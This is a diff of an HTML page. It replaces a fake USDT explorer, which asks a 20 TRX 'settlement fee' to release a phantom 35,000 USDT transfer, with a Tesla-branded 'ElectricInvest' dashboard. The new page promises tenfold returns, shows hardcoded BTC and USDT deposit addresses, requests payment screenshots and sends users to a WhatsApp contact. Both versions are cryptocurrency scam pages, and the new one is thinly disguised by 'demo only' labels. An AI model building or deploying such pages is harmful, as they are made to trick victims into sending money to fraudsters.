@@ -1,157 +1,537 @@
-<!DOCTYPE html>
-<html lang="en" class="dark">
+<!doctype html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tether Explorer | Professional USDT Network</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/framer-motion@10.16.4/dist/framer-motion.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Space+Mono&display=swap" rel="stylesheet">
-    <script>
-        tailwind.config = {
-            darkMode: 'class',
-            theme: {
-                extend: {
-                    fontFamily: {
-                        sans: ['DM Sans', 'sans-serif'],
-                        mono: ['Space Mono', 'monospace'],
-                    },
-                }
-            }
-        }
-    </script>
-    <style>
-        body { background-color: #0a0b0d; color: #ffffff; }
-        .glass { background: rgba(23, 25, 28, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
-        .usdt-gradient { background: linear-gradient(135deg, #26a17b 0%, #50af95 100%); }
-        .loading-bar { height: 2px; background: #26a17b; width: 0%; transition: width 0.3s ease; }
-        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
-        .ticker { display: inline-block; animation: ticker 30s linear infinite; }
-        .ticker-wrap { overflow: hidden; white-space: nowrap; border-bottom: 1px solid rgba(255,255,255,0.1); background: rgba(0,0,0,0.3); }
-        @keyframes slideIn { from { transform: translateX(-5px); opacity: 0.5; } to { transform: translateX(5px); opacity: 1; } }
-        .animate-slide { display: inline-block; animation: slideIn 0.6s ease-out infinite alternate; }
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>ElectricInvest — Demo Investment Dashboard</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --bg:#0f1724;
+      --card:#0b1220;
+      --muted:#94a3b8;
+      --accent:#00d1b2;
+      --accent-2:#6ee7b7;
+      --glass: rgba(255,255,255,0.03);
+      --danger:#ff6b6b;
+      --white:#e6eef8;
+      --glass-2: rgba(255,255,255,0.02);
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%;margin:0;font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial;background:linear-gradient(180deg,#071028 0%, #071322 60%, #04101a 100%);color:var(--white);-webkit-font-smoothing:antialiased}
+    .container{max-width:1100px;margin:36px auto;padding:24px}
+    header{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
+    .brand{display:flex;align-items:center;gap:12px}
+    .logo{
+      width:54px;height:54px;border-radius:12px;background:linear-gradient(135deg,var(--accent),var(--accent-2));
+      display:flex;align-items:center;justify-content:center;font-weight:800;color:#012;letter-spacing:1px;font-size:18px;box-shadow:0 6px 30px rgba(0,210,178,0.12);
+    }
+    h1{font-size:20px;margin:0}
+    .tag{color:var(--muted);font-size:13px}
+    nav{display:flex;gap:12px;align-items:center}
+    .btn{background:var(--accent);color:#042024;padding:10px 14px;border-radius:8px;font-weight:600;border:none;cursor:pointer;box-shadow:0 8px 24px rgba(0,210,178,0.08)}
+    .btn.ghost{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--white)}
+    .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:14px;padding:18px;box-shadow:0 6px 30px rgba(2,6,23,0.6);border:1px solid rgba(255,255,255,0.02)}
+    .grid{display:grid;grid-template-columns: 1fr 360px;gap:18px}
+    .holdings{padding:18px}
+    .balance-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
+    .balance{font-size:28px;font-weight:700}
+    .sub{color:var(--muted);font-size:13px}
+    .coins{display:flex;flex-direction:column;gap:10px;margin-top:12px}
+    .coin{display:flex;align-items:center;justify-content:space-between;padding:10px;border-radius:10px;background:var(--glass-2);border:1px solid rgba(255,255,255,0.02)}
+    .coin .left{display:flex;align-items:center;gap:12px}
+    .avatar{width:44px;height:44;border-radius:10px;background:rgba(255,255,255,0.03);display:inline-flex;align-items:center;justify-content:center;font-weight:700}
+    .coin .meta{display:flex;flex-direction:column}
+    .plan-btn{display:flex;flex-wrap:wrap;gap:10px;margin-top:12px}
+    .plan{background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.02));padding:14px;border-radius:10px;border:1px solid rgba(255,255,255,0.02);cursor:pointer}
+    .plan.selected{outline:2px solid rgba(0,209,178,0.18);box-shadow:0 12px 30px rgba(0,209,178,0.05)}
+    footer{margin-top:24px;color:var(--muted);font-size:13px;text-align:center}
+    /* modal */
+    .modal-backdrop{position:fixed;inset:0;background:linear-gradient(0deg, rgba(2,6,23,0.6), rgba(2,6,23,0.8));display:none;align-items:center;justify-content:center;padding:18px;z-index:80}
+    .modal{width:100%;max-width:760px;background:linear-gradient(180deg,#071226 0%, #041222 100%);border-radius:14px;padding:20px;border:1px solid rgba(255,255,255,0.03)}
+    .modal h2{margin:0 0 8px 0}
+    .row{display:flex;gap:12px;align-items:center}
+    .field{display:flex;flex-direction:column;gap:8px;margin-bottom:12px}
+    input[type="text"], input[type="email"], input[type="password"], select{background:transparent;border:1px solid rgba(255,255,255,0.06);padding:10px;border-radius:8px;color:var(--white);outline:none}
+    .small{font-size:13px;color:var(--muted)}
+    .muted{color:var(--muted)}
+    .center{display:flex;align-items:center;justify-content:center}
+    .logo-spin{width:120px;height:120px;border-radius:20px;background:linear-gradient(135deg,var(--accent),#3aeac1);display:flex;align-items:center;justify-content:center;color:#042024;font-weight:800;font-size:20px;box-shadow:0 16px 40px rgba(0,210,178,0.14)}
+    .spin{animation:spin 6s linear}
+    @keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+    .hidden{display:none}
+    .copy{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.03);padding:8px;border-radius:8px;cursor:pointer}
+    .preview{max-width:160px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);display:block;margin-top:8px}
+    /* forms panel */
+    .auth{max-width:420px;margin-left:auto}
+    .auth .card{padding:20px}
+    .linklike{background:transparent;border:none;color:var(--accent);cursor:pointer;font-weight:600}
+    .small-muted{font-size:12px;color:var(--muted)}
+    /* responsive */
+    @media (max-width:950px){
+      .grid{grid-template-columns:1fr;align-items:stretch}
+      .auth{margin:0;padding-top:12px}
+    }
+  </style>
 </head>
-<body class="font-sans">
-    <div class="ticker-wrap py-2 text-xs font-mono text-gray-400">
-        <div class="ticker">
-            <span class="mx-4"><span class="text-[#26a17b]">USDT/USD:</span> $1.00 (0.00%)</span>
-            <span class="mx-4"><span class="text-blue-400">TRX/USD:</span> $0.12 (+2.4%)</span>
-            <span class="mx-4">USDT Market Cap: $95.2B</span>
-            <span class="mx-4">24h Volume: $42.8B</span>
-            <span class="mx-4 text-[#26a17b]">Total Supply: 98.2B USDT</span>
+<body>
+  <div class="container">
+    <header>
+      <div class="brand">
+        <div class="logo" aria-hidden>EV</div>
+        <div>
+          <h1>ElectricInvest — Demo</h1>
+          <div class="tag">Design demo: modern EV-inspired investment dashboard (Simulation only)</div>
         </div>
+      </div>
+
+      <nav id="top-nav">
+        <div class="sub muted" id="welcome-text">Welcome — please register or log in</div>
+        <div style="display:flex;gap:10px">
+          <button class="btn" id="open-register">Register</button>
+          <button class="btn ghost" id="open-login">Login</button>
+        </div>
+      </nav>
+    </header>
+
+    <main class="grid">
+      <section class="card holdings">
+        <div class="balance-row">
+          <div>
+            <div class="sub">Portfolio Balance</div>
+            <div class="balance" id="usd-balance">$0.00</div>
+            <div class="sub small-muted">MINIMUM INVESTMENT: $500 — Demo display only</div>
+          </div>
+          <div style="text-align:right">
+            <button class="btn" id="fund-account-btn">Fund Account</button>
+            <div style="margin-top:8px" class="small-muted">Your funds are simulated in this demo</div>
+          </div>
+        </div>
+
+        <div class="coins" id="coins-list">
+          <div class="coin">
+            <div class="left">
+              <div class="avatar">₿</div>
+              <div class="meta">
+                <div style="font-weight:700">Bitcoin (BTC)</div>
+                <div class="small muted">Holding: 0.00000000</div>
+              </div>
+            </div>
+            <div style="text-align:right">
+              <div style="font-weight:700">$0.00</div>
+              <div class="small muted">Price demo</div>
+            </div>
+          </div>
+          <div class="coin">
+            <div class="left">
+              <div class="avatar">Ξ</div>
+              <div class="meta">
+                <div style="font-weight:700">Ethereum (ETH)</div>
+                <div class="small muted">Holding: 0.00000000</div>
+              </div>
+            </div>
+            <div style="text-align:right">
+              <div style="font-weight:700">$0.00</div>
+              <div class="small muted">Price demo</div>
+            </div>
+          </div>
+          <div class="coin">
+            <div class="left">
+              <div class="avatar">◈</div>
+              <div class="meta">
+                <div style="font-weight:700">USDT</div>
+                <div class="small muted">Holding: 0.00</div>
+              </div>
+            </div>
+            <div style="text-align:right">
+              <div style="font-weight:700">$0.00</div>
+              <div class="small muted">Stable</div>
+            </div>
+          </div>
+          <div class="coin">
+            <div class="left">
+              <div class="avatar">ⓑ</div>
+              <div class="meta">
+                <div style="font-weight:700">BNB</div>
+                <div class="small muted">Holding: 0.00000000</div>
+              </div>
+            </div>
+            <div style="text-align:right">
+              <div style="font-weight:700">$0.00</div>
+              <div class="small muted">Price demo</div>
+            </div>
+          </div>
+        </div>
+
+        <div style="margin-top:18px" class="sub muted">Investment Plans (demo only)</div>
+        <div class="plan-btn" id="plans-panel">
+          <!-- plans inserted by JS -->
+        </div>
+      </section>
+
+      <aside class="auth card">
+        <div id="auth-panel">
+          <h3 style="margin-top:0">Account</h3>
+          <div class="small-muted">Register, log in and manage your portfolio.</div>
+
+          <div style="margin-top:12px" id="auth-actions">
+            <button class="btn" id="open-register-2">Create Account</button>
+            <button class="btn ghost" id="open-login-2">Sign In</button>
+            <div style="margin-top:12px" class="small-muted">powered by TESLA.</div>
+          </div>
+
+          <div id="account-info" class="hidden" style="margin-top:14px">
+            <div style="display:flex;justify-content:space-between;align-items:center">
+              <div>
+                <div style="font-size:16px;font-weight:700" id="acct-name">User</div>
+                <div class="small-muted" id="acct-email">email@example.com</div>
+              </div>
+              <div>
+                <button class="btn ghost" id="logout-btn">Logout</button>
+              </div>
+            </div>
+            <div style="margin-top:12px">
+              <div class="small-muted">Holdings overview</div>
+              <div style="margin-top:8px" id="mini-holdings">
+                <div class="small-muted">BTC: 0.00000000</div>
+                <div class="small-muted">ETH: 0.00000000</div>
+                <div class="small-muted">USDT: 0.00</div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </aside>
+    </main>
+
+    <footer>
+      <div style="max-width:900px;margin:12px auto;color:var(--muted)">
+        Tesla inc 2026®| all rights reserved 
+      </div>
+    </footer>
+  </div>
+
+  <!-- Modal backdrop -->
+  <div id="modal-root" class="modal-backdrop" role="dialog" aria-modal="true">
+    <div class="modal" id="modal">
+      <!-- dynamic content -->
     </div>
+  </div>
 
-    <div id="app" class="min-h-screen flex flex-col">
-        <nav class="border-b border-white/10 p-4 sticky top-0 bg-[#0a0b0d]/80 backdrop-blur-md z-50">
-            <div class="max-w-7xl mx-auto flex justify-between items-center">
-                <div class="flex items-center gap-2 cursor-pointer" onclick="showHome()">
-                    <div class="w-8 h-8 usdt-gradient rounded-full flex items-center justify-center font-bold text-white">₮</div>
-                    <span class="font-bold text-xl tracking-tight uppercase">Tether Explorer</span>
-                </div>
+  <script>
+    // Demo app: localStorage-based users & session
+    (function(){
+      const plans = [
+        {id:1,label:'🔆 INVEST $500 GET $5,000',min:500},
+        {id:2,label:'🔰 INVEST $1000 GET $15,000',min:1000},
+        {id:3,label:'🔰 INVEST $2000 GET $30,000',min:2000},
+        {id:4,label:'🔰 INVEST $3000 GET $45,000',min:3000},
+        {id:5,label:'🔰 INVEST $4000 GET $60,000',min:4000},
+        {id:6,label:'🔰 INVEST $5000 GET $75,000',min:5000},
+        {id:7,label:'🔰 INVEST $10,000 GET $150,000',min:10000},
+        {id:8,label:'💎 1BTC earn 5BTC',min:0},
+        {id:9,label:'💎 2BTC earn 10BTC',min:0},
+        {id:10,label:'💎 3BTC earn 15BTC',min:0},
+        {id:11,label:'💎 4BTC earn 20BTC',min:0},
+        {id:12,label:'💎 5BTC earn 25BTC',min:0}
+      ];
+      // Addresses provided (display only)
+      const BTC_ADDRESS = 'bc1qguvzp38e4065dugw53hwxpuvtxf9tcmpe0yccv';
+      const USDT_ADDRESS = 'TPvJmf6ujpLQ3FoLXkZXyTPD8CtcJcuAdU';
+      const WHATSAPP_LINK = 'https://wa.me/+17302292192';
+
+      // DOM references
+      const plansPanel = document.getElementById('plans-panel');
+      const modalRoot = document.getElementById('modal-root');
+      const modal = document.getElementById('modal');
+      const fundBtn = document.getElementById('fund-account-btn');
+      const openRegBtns = document.querySelectorAll('#open-register, #open-register-2');
+      const openLoginBtns = document.querySelectorAll('#open-login, #open-login-2');
+      const topNav = document.getElementById('top-nav');
+      const welcomeText = document.getElementById('welcome-text');
+      const authPanel = document.getElementById('auth-panel');
+      const authActions = document.getElementById('auth-actions');
+      const accountInfo = document.getElementById('account-info');
+      const acctName = document.getElementById('acct-name');
+      const acctEmail = document.getElementById('acct-email');
+      const logoutBtn = document.getElementById('logout-btn');
+      const usdBalance = document.getElementById('usd-balance');
+      const coinsList = document.getElementById('coins-list');
+
+      // simple storage helpers
+      function getUsers(){ try { return JSON.parse(localStorage.getItem('demo_users')||'[]'); } catch(e){ return [] } }
+      function setUsers(u){ localStorage.setItem('demo_users', JSON.stringify(u)); }
+      function getSession(){ try { return JSON.parse(sessionStorage.getItem('demo_session')||'null'); } catch(e){ return null } }
+      function setSession(s){ sessionStorage.setItem('demo_session', JSON.stringify(s)); }
+      function clearSession(){ sessionStorage.removeItem('demo_session'); }
+
+      // render plans
+      function renderPlans(){
+        plansPanel.innerHTML = '';
+        plans.forEach(p=>{
+          const btn = document.createElement('div');
+          btn.className = 'plan';
+          btn.dataset.id = p.id;
+          btn.innerHTML = `<div style="font-weight:700">${p.label}</div><div class="small-muted">${p.min>0? 'Minimum: $'+p.min:''}</div>`;
+          btn.addEventListener('click', ()=>openFundFlow(p));
+          plansPanel.appendChild(btn);
+        });
+      }
+
+      // open fund modal
+      function openFundFlow(plan){
+        modalRoot.style.display = 'flex';
+        modal.innerHTML = `
+          <h2>Fund Account — Preview</h2>
+          <div class="small-muted">Selected plan</div>
+          <div style="margin-top:12px" class="card">
+            <div style="display:flex;justify-content:space-between;align-items:center">
+              <div>
+                <div style="font-weight:800">${plan.label}</div>
+                <div class="small-muted">This is a demo flow. No payments processed.</div>
+              </div>
+              <div style="text-align:right">
+                <div class="small-muted">Estimated</div>
+                <div style="font-weight:700">${plan.min>0? '$'+plan.min:'Varies'}</div>
+              </div>
             </div>
-        </nav>
+          </div>
 
-        <main class="max-w-7xl mx-auto p-4 md:p-8 flex-1 w-full">
-            <div id="home-view">
-                <div class="text-center py-12">
-                    <h1 class="text-4xl md:text-6xl font-bold mb-4 tracking-tight">USDT Asset Explorer</h1>
-                    <p class="text-gray-400 text-lg mb-10">Real-time tracking of Tether (USDT) assets on TRC20 and ERC20 networks</p>
-                    <div class="max-w-3xl mx-auto relative group">
-                        <input type="text" id="search-input" placeholder="Enter TRC20 Address or Transaction Hash" class="w-full bg-[#17191c] border border-white/10 rounded-2xl px-6 py-5 focus:outline-none focus:ring-2 focus:ring-[#26a17b]/40 text-lg font-mono">
-                        <button onclick="handleSearch()" class="absolute right-3 top-3 bottom-3 px-10 usdt-gradient rounded-xl font-bold text-white">Search</button>
-                    </div>
-                </div>
+          <div style="margin-top:12px" class="small-muted">Choose deposit method</div>
+          <div style="display:flex;gap:8px;margin-top:8px">
+            <button class="btn" id="use-btc">Deposit BTC</button>
+            <button class="btn ghost" id="use-usdt">Deposit USDT</button>
+          </div>
 
-                <div class="grid grid-cols-1 md:grid-cols-4 gap-4 mb-10">
-                    <div class="glass p-5 rounded-2xl"><div class="text-gray-500 text-xs font-bold mb-2 uppercase">USDT Assets</div><div class="text-xl font-bold text-[#26a17b]">$98.2B</div></div>
-                    <div class="glass p-5 rounded-2xl"><div class="text-gray-500 text-xs font-bold mb-2 uppercase">TRC20 Circulation</div><div class="text-xl font-bold">$52.4B</div></div>
-                    <div class="glass p-5 rounded-2xl"><div class="text-gray-500 text-xs font-bold mb-2 uppercase">Reserve Status</div><div class="text-xl font-bold">100% Verified</div></div>
-                    <div class="glass p-5 rounded-2xl"><div class="text-gray-500 text-xs font-bold mb-2 uppercase">Active Nodes</div><div class="text-xl font-bold">8,412</div></div>
+          <div style="margin-top:14px;display:flex;gap:10px;align-items:center">
+            <button class="btn ghost" id="close-modal">Close</button>
+          </div>
+        `;
+
+        modal.querySelector('#close-modal').addEventListener('click', closeModal);
+        modal.querySelector('#use-btc').addEventListener('click', ()=>startSpinThenShowAddress('BTC', plan));
+        modal.querySelector('#use-usdt').addEventListener('click', ()=>startSpinThenShowAddress('USDT', plan));
+      }
+
+      function closeModal(){
+        modalRoot.style.display = 'none';
+        modal.innerHTML = '';
+      }
+
+      // spinner then show deposit details
+      function startSpinThenShowAddress(method, plan){
+        modal.innerHTML = `
+          <div class="center" style="flex-direction:column;gap:12px">
+            <div class="logo-spin" id="spinLogo">EV</div>
+            <div class="small-muted">Preparing deposit instructions — please wait</div>
+          </div>
+        `;
+        // add spin class for animation
+        const logoEl = document.getElementById('spinLogo');
+        logoEl.classList.add('spin');
+
+        // spin for 6 seconds
+        setTimeout(()=>{
+          // replace with deposit details
+          modal.innerHTML = `
+            <h2>Deposit Instructions</h2>
+            <div class="small-muted">Method: ${method}</div>
+            <div style="margin-top:12px" class="card">
+              <div style="display:flex;justify-content:space-between;align-items:center">
+                <div>
+                  <div style="font-weight:800">${method === 'BTC' ? 'Bitcoin (BTC)' : 'USDT (TRC20/OMNI/ETH – confirm network)'}</div>
+                  <div class="small-muted">Send exactly the amount shown to the address below</div>
                 </div>
+              </div>
+
+              <div style="margin-top:12px">
+                <div class="small-muted">Deposit Address</div>
+                <div style="margin-top:8px;display:flex;gap:8px;align-items:center">
+                  <div class="copy" id="address-box" style="flex:1;overflow-wrap:anywhere">${method==='BTC'? '${BTC}':'${USDT}'}</div>
+                  <button class="btn ghost" id="copy-address">Copy</button>
+                </div>
+                <div class="small-muted" style="margin-top:8px">After sending, upload a screenshot of your transaction below and click "I have paid — confirm my deposit".</div>
+                <div style="margin-top:10px">
+                  <input type="file" id="payment-screenshot" accept="image/*" />
+                  <img id="screenshot-preview" class="preview hidden" alt="screenshot preview" />
+                </div>
+                <div style="margin-top:12px" class="row">
+                  <button class="btn" id="confirm-paid">I have paid — confirm my deposit</button>
+                  <button class="btn ghost" id="cancel-deposit">Cancel</button>
+                </div>
+              </div>
             </div>
+          `;
+          // replace placeholders safely
+          const addressBox = modal.querySelector('#address-box');
+          addressBox.textContent = method==='BTC' ? BTC_ADDRESS : USDT_ADDRESS;
 
-            <div id="loading-view" class="hidden py-32 text-center">
-                <div class="w-20 h-20 border-4 border-[#26a17b] border-t-transparent rounded-full animate-spin mx-auto mb-10"></div>
-                <h2 id="loading-text" class="text-3xl font-bold mb-3 tracking-tight">Accessing USDT Ledger...</h2>
-                <div class="max-w-md mx-auto mt-12 bg-white/5 h-1.5 rounded-full overflow-hidden"><div id="progress-bar" class="loading-bar h-full"></div></div>
+          modal.querySelector('#copy-address').addEventListener('click', ()=>{
+            navigator.clipboard && navigator.clipboard.writeText(addressBox.textContent).then(()=>{
+              alert('Address copied to clipboard (demo).');
+            }).catch(()=>{ alert('Copy failed — please select and copy manually.'); });
+          });
+
+          const fileInput = modal.querySelector('#payment-screenshot');
+          const preview = modal.querySelector('#screenshot-preview');
+          fileInput.addEventListener('change', (ev)=>{
+            const file = ev.target.files[0];
+            if(!file) return;
+            const url = URL.createObjectURL(file);
+            preview.src = url;
+            preview.classList.remove('hidden');
+          });
+
+          modal.querySelector('#cancel-deposit').addEventListener('click', closeModal);
+
+          modal.querySelector('#confirm-paid').addEventListener('click', ()=>{
+            // require a screenshot in demo to proceed
+            const file = fileInput.files[0];
+            if(!file){
+              if(!confirm('No screenshot uploaded. Proceed anyway in demo?')) return;
+            }
+            // show loading 10s then redirect to WhatsApp (demo support)
+            modal.innerHTML = `
+              <div class="center" style="flex-direction:column;gap:12px">
+                <div class="logo-spin" style="width:90px;height:90px; border-radius:12px">EV</div>
+                <div class="small-muted">Confirming deposit — this is a simulated confirmation. You will be redirected to support after completion.</div>
+                <div class="small-muted">Please wait...</div>
+              </div>
+            `;
+            setTimeout(()=>{
+              // close and redirect
+              closeModal();
+              // Redirect to WhatsApp support link (opens in new tab)
+              window.open('${WHATSAPP_LINK}', '_blank');
+            }, 10000);
+          });
+
+        }, 6000);
+      }
+
+      // AUTH UI
+      function openRegisterModal(){
+        modalRoot.style.display = 'flex';
+        modal.innerHTML = `
+          <h2>Create Demo Account</h2>
+          <div class="small-muted">This demo stores accounts locally in your browser (localStorage). Do not use real credentials.</div>
+          <div style="margin-top:12px">
+            <div class="field"><label class="small-muted">Full name</label><input id="reg-name" type="text" placeholder="Jane Doe" /></div>
+            <div class="field"><label class="small-muted">Email</label><input id="reg-email" type="email" placeholder="name@example.com" /></div>
+            <div class="field"><label class="small-muted">Password</label><input id="reg-pass" type="password" placeholder="password" /></div>
+            <div style="display:flex;gap:8px">
+              <button class="btn" id="create-account">Create account</button>
+              <button class="btn ghost" id="close-modal-2">Cancel</button>
             </div>
+          </div>
+        `;
+        modal.querySelector('#close-modal-2').addEventListener('click', closeModal);
+        modal.querySelector('#create-account').addEventListener('click', ()=>{
+          const name = modal.querySelector('#reg-name').value.trim();
+          const email = modal.querySelector('#reg-email').value.trim().toLowerCase();
+          const pass = modal.querySelector('#reg-pass').value;
+          if(!name || !email || !pass){ alert('Please complete all fields.'); return; }
+          const users = getUsers();
+          if(users.find(u=>u.email === email)){ alert('An account with that email already exists. Please log in.'); return; }
+          users.push({name, email, pass, createdAt: new Date().toISOString(), balanceUSD:0, holdings:{BTC:0,ETH:0,USDT:0,BNB:0}});
+          setUsers(users);
+          closeModal();
+          alert('Account created (demo). You may now log in.');
+        });
+      }
 
-            <div id="result-view" class="hidden">
-                <div class="flex items-center justify-between mb-10">
-                    <button onclick="showHome()" class="text-gray-400">← Back</button>
-                    <div id="special-notice" class="hidden bg-yellow-500/5 border border-yellow-500/20 p-5 rounded-2xl flex items-start gap-4 max-w-lg">
-                        <p class="text-xs text-yellow-500 font-bold uppercase">⚠️ NOTICE: Network protocol settlement required. Immediate TRX settlement needed for fund release to destination.</p>
-                    </div>
-                </div>
-
-                <div class="glass rounded-2xl overflow-hidden mb-10">
-                    <div class="p-6 border-b border-white/10 flex justify-between items-center bg-white/[0.02]">
-                        <div class="font-mono text-gray-500 text-xs tracking-tighter" id="tx-hash"></div>
-                        <span class="bg-[#26a17b]/10 text-[#26a17b] px-4 py-1.5 rounded-full text-[10px] font-bold uppercase flex items-center gap-2">
-                            Incoming <span class="animate-slide">→</span>
-                        </span>
-                    </div>
-                    <div class="grid grid-cols-1 md:grid-cols-4 gap-12 p-10">
-                        <div><div class="text-gray-500 text-[10px] font-bold uppercase mb-2">Total Amount</div><div id="tx-value" class="text-2xl font-bold text-[#26a17b] font-mono"></div></div>
-                        <div><div class="text-gray-500 text-[10px] font-bold uppercase mb-2">Network Fee</div><div id="tx-fee" class="text-2xl font-bold font-mono"></div></div>
-                        <div><div class="text-gray-500 text-[10px] font-bold uppercase mb-2">Confirmations</div><div class="text-2xl font-bold text-green-500 font-mono">12/12</div></div>
-                        <div><div class="text-gray-500 text-[10px] font-bold uppercase mb-2">Protocol</div><div class="text-2xl font-bold text-white font-mono uppercase">TRC20</div></div>
-                    </div>
-                </div>
-
-                <div id="special-actions" class="hidden glass rounded-2xl p-10 text-center border-yellow-500/10 shadow-2xl shadow-yellow-500/5">
-                    <h3 class="text-2xl font-bold mb-4">Awaiting TRON Network Fee (TRX)</h3>
-                    <p class="text-gray-400 mb-10">A settlement of 20 TRX is required to clear the protocol queue and finalize the transfer.</p>
-                    <button onclick="handleReleaseFunds()" class="usdt-gradient px-16 py-5 rounded-2xl font-bold text-white uppercase tracking-widest">I HAVE PAID RELEASE FUNDS</button>
-                </div>
+      function openLoginModal(){
+        modalRoot.style.display = 'flex';
+        modal.innerHTML = `
+          <h2>Sign In</h2>
+          <div class="small-muted">Use the demo account you created.</div>
+          <div style="margin-top:12px">
+            <div class="field"><label class="small-muted">Email</label><input id="login-email" type="email" placeholder="name@example.com" /></div>
+            <div class="field"><label class="small-muted">Password</label><input id="login-pass" type="password" placeholder="password" /></div>
+            <div style="display:flex;gap:8px">
+              <button class="btn" id="do-login">Sign In</button>
+              <button class="btn ghost" id="close-modal-3">Cancel</button>
             </div>
+          </div>
+        `;
+        modal.querySelector('#close-modal-3').addEventListener('click', closeModal);
+        modal.querySelector('#do-login').addEventListener('click', ()=>{
+          const email = modal.querySelector('#login-email').value.trim().toLowerCase();
+          const pass = modal.querySelector('#login-pass').value;
+          const users = getUsers();
+          const u = users.find(x=>x.email === email && x.pass === pass);
+          if(!u){ alert('Invalid credentials (demo).'); return; }
+          setSession({email:u.email});
+          closeModal();
+          refreshAuthUI();
+        });
+      }
 
-            <div id="not-found-view" class="hidden py-32 text-center glass rounded-3xl">
-                <h2 class="text-3xl font-bold mb-4">Address Not Found</h2>
-                <button onclick="showHome()" class="bg-white/5 px-10 py-4 rounded-xl font-bold">Back to Home</button>
-            </div>
-        </main>
-    </div>
-
-    <script>
-        const SPECIAL_ADDR = "TDDW3JnTQietyVdY2w56dioFURLHaoP1Uy";
-        function switchView(id) { ['home-view', 'loading-view', 'result-view', 'not-found-view'].forEach(v => document.getElementById(v).classList.add('hidden')); document.getElementById(id).classList.remove('hidden'); }
-
-        async function handleSearch() {
-            const q = document.getElementById('search-input').value.trim();
-            if (!q) return;
-            switchView('loading-view');
-            await simulateProgress(q === SPECIAL_ADDR ? 15 : 40);
-            if (q === SPECIAL_ADDR) {
-                document.getElementById('tx-hash').innerText = "0xF2B3C4D5E6F7G8H9I0J1K2L3M4N5O6P7Q8R9S0T1";
-                document.getElementById('tx-value').innerText = "35,000.00 USDT";
-                const feeEl = document.getElementById('tx-fee');
-                feeEl.innerText = "20 TRX Needed";
-                feeEl.className = "text-2xl font-bold text-red-500 animate-pulse font-mono";
-                document.getElementById('special-notice').classList.remove('hidden');
-                document.getElementById('special-actions').classList.remove('hidden');
-                switchView('result-view');
-            } else switchView('not-found-view');
+      function refreshAuthUI(){
+        const s = getSession();
+        if(!s){ // logged out
+          authActions.style.display = 'block';
+          accountInfo.classList.add('hidden');
+          welcomeText.textContent = 'Welcome — please register or log in';
+          usdBalance.textContent = '$0.00';
+        } else {
+          const users = getUsers();
+          const user = users.find(u=>u.email === s.email);
+          acctName.textContent = user.name;
+          acctEmail.textContent = user.email;
+          authActions.style.display = 'none';
+          accountInfo.classList.remove('hidden');
+          welcomeText.textContent = 'Signed in as '+user.name;
+          usdBalance.textContent = '$' + Number(user.balanceUSD || 0).toFixed(2);
+          // mini holdings show
+          const mini = document.getElementById('mini-holdings');
+          mini.innerHTML = `
+            <div class="small-muted">BTC: ${Number(user.holdings.BTC||0).toFixed(8)}</div>
+            <div class="small-muted">ETH: ${Number(user.holdings.ETH||0).toFixed(8)}</div>
+            <div class="small-muted">USDT: ${Number(user.holdings.USDT||0).toFixed(2)}</div>
+          `;
         }
+      }
 
-        async function handleReleaseFunds() {
-            switchView('loading-view');
-            document.getElementById('loading-text').innerText = "Broadcasting Priority Release...";
-            await simulateProgress(15);
-            window.location.href = "https://www.blockchain.com";
-        }
+      logoutBtn.addEventListener('click', ()=>{
+        clearSession();
+        refreshAuthUI();
+      });
 
-        function simulateProgress(s) {
-            return new Promise(r => {
-                let c = 0; const i = setInterval(() => {
-                    c++; document.getElementById('progress-bar').style.width = (c/(s*10))*100 + '%';
-                    if (c >= s*10) { clearInterval(i); r(); }
-                }, 100);
-            });
-        }
-        function showHome() { switchView('home-view'); }
-    </script>
+      // wire up
+      renderPlans();
+      refreshAuthUI();
+
+      fundBtn.addEventListener('click', ()=> {
+        // open plan selection modal
+        modalRoot.style.display = 'flex';
+        modal.innerHTML = `
+          <h2>Choose an Investment Plan</h2>
+          <div class="small-muted">Select a plan to simulate funding. Demo only.</div>
+          <div style="margin-top:12px" id="modal-plans" class="plan-btn"></div>
+          <div style="margin-top:12px"><button class="btn ghost" id="close-modal-4">Close</button></div>
+        `;
+        const modalPlans = modal.querySelector('#modal-plans');
+        plans.forEach(p=>{
+          const el = document.createElement('div');
+          el.className = 'plan';
+          el.style.minWidth = '220px';
+          el.innerHTML = `<div style="font-weight:700">${p.label}</div><div class="small-muted">${p.min>0? 'Minimum: $'+p.min:''}</div>`;
+          el.addEventListener('click', ()=>{ closeModal(); openFundFlow(p); });
+          modalPlans.appendChild(el);
+        });
+        modal.querySelector('#close-modal-4').addEventListener('click', closeModal);
+      });
+
+      openRegBtns.forEach(b=>b.addEventListener('click', openRegisterModal));
+      openLoginBtns.forEach(b=>b.addEventListener('click', openLoginModal));
+
+      // global close modal clicking backdrop
+      modalRoot.addEventListener('click', (e)=>{ if(e.target === modalRoot) closeModal(); });
+
+      // initialize with demo users array if missing
+      if(!localStorage.getItem('demo_users')) setUsers([]);
+    })();
+  </script>
 </body>
 </html>
